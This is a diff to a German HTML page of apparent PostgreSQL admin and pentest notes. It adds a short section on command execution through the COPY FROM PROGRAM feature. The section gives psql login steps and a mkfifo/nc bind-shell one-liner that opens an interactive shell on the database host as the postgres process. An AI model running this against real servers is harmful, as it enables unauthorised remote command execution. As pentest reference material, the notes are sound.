@@ -71,7 +71,31 @@ beim exploit „scanner/postgres/postgres_login“</em></p>
 <li><p>less /var/log/postgresql/postgresql-14-main.log</p></li>
 <li><p>psql -h &lt;IP&gt; -p 5432 -d &lt;DB&gt; -U &lt;user&gt; -W</p></li>
 </ol>
+<section id="command-execution-with-copy-command">
+<h3>Command Execution with COPY Command<a class="headerlink" href="#command-execution-with-copy-command" title="Permalink to this heading">¶</a></h3>
+<p>Quelle: <a class="reference external" href="https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767">https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767</a></p>
+<p>In diesem Szenario erfolgt eine remote Anmeldung an die postgres-Datenbank; es wird ein Listener eingerichtet, um beliebige
+Befehle auf dem Zielhost abzusetzen.</p>
+<ol class="arabic">
+<li><p>Anmelden an Datenbanken mit Admin-User:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">psql</span> <span class="o">-</span><span class="n">h</span> <span class="o">&lt;</span><span class="n">Zielhost</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">U</span> <span class="o">&lt;</span><span class="n">User</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">d</span> <span class="o">&lt;</span><span class="n">Datenbank</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">W</span>
+</pre></div>
+</div>
+</li>
+<li><p>Remote Listener einrichten:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">COPY</span> <span class="n">shell</span> <span class="n">FROM</span> <span class="n">PROGRAM</span> <span class="s1">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc -l &lt;Zielhost&gt; &lt;PORT&gt; &gt; /tmp/f&#39;</span><span class="p">;</span>
+</pre></div>
+</div>
+</li>
+<li><p>in einer neuen Shell können dann bash Befehle abgesetzt werden:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">nc</span> <span class="o">&lt;</span><span class="n">Zielhost</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">PORT</span><span class="o">&gt;</span>
+</pre></div>
+</div>
+<p>Befehle werden im Kontext des postgres-Serverprocesses ausgeführt.</p>
+</li>
+</ol>
 <p>Zurück zu <a class="reference internal" href="#postgresql"><span class="std std-ref">Konfiguration</span></a></p>
+</section>
 </section>
 </section>
 
